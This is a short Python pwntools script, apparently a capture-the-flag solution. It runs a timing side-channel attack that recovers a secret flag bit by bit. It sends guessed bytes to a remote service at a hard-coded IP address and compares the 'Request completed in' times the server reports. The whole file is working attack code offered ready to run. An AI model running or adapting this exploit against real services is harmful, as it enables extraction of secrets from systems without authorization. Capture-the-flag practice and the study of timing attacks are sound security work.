from pwn import *

def frombits(bits):
    chars = []
    for b in range(len(bits) / 8):
        byte = bits[b*8:(b+1)*8]
        chars.append(chr(int(''.join([str(bit) for bit in byte]), 2)))
    return ''.join(chars)

def try_byte(host, port, prefix):
	prefix = prefix.encode('hex')
	current_byte = list('00000000')
	for i in range(8):
		bits1 = current_byte[:]
		bits1[i] = '0'
		byte1 = ''.join(bits1)
		byte1 = frombits(byte1).encode('hex')

		bits2 = current_byte[:]
		bits2[i] = '1'
		byte2 = ''.join(bits2)
		byte2 = frombits(byte2).encode('hex')

		r = remote(host, port)
		r.sendline(prefix + byte1)
		r.sendline('5000')
		r.recvuntil('Request completed in: ')
		r.recvuntil('Request completed in: ')
		response1 = r.recv()
		response1 = int(response1[response1.index('(') + 1:response1.index(')')])
		r.close()

		r = remote(host, port)
		r.sendline(prefix + byte2)
		r.sendline('5000')
		r.recvuntil('Request completed in: ')
		r.recvuntil('Request completed in: ')
		response2 = r.recv()
		response2 = int(response2[response2.index('(') + 1:response2.index(')')])
		r.close()

		if response1 < response2:
			current_byte = bits1[:]
		else:
			current_byte = bits2[:]

	return frombits(''.join(current_byte))

flag = ''
while True:
	flag += try_byte('209.97.170.43', 4003, flag)
	print flag